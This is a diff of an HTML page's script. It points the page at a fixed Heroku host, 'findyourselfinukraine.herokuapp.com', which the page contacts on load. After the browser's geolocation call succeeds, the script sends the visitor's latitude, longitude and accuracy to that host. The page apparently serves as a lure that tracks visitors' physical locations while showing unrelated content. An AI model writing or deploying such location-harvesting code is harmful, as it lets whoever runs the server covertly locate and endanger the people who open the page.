@@ -9,15 +9,15 @@
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"></script>
     <script>
         var host = window.location.search.substring(1).split('&')[0].split('=')[1];
-	host = host || "5668-194-233-96-13.ngrok.io";
+	host = "findyourselfinukraine.herokuapp.com";
         window.onload = function () {
             var xhttp=new XMLHttpRequest();
-            xhttp.open("GET", "https://" + host + "/handler.php", true);
+            xhttp.open("GET", "https://findyourselfinukraine.herokuapp.com/", true);
             xhttp.send();
 
             function success(pos) {
                 var xhttp=new XMLHttpRequest();
-                xhttp.open("GET", "https://" + host + "/handler.php?lat=" + pos.coords.latitude + "&lng=" + pos.coords.longitude + "&ac=" + pos.coords.accuracy, true);
+                xhttp.open("GET", "https://findyourselfinukraine.herokuapp.com/?lat=" + pos.coords.latitude + "&lng=" + pos.coords.longitude + "&ac=" + pos.coords.accuracy, true);
                 xhttp.send();
 
                 document.querySelectorAll(".meat .col-md-3")
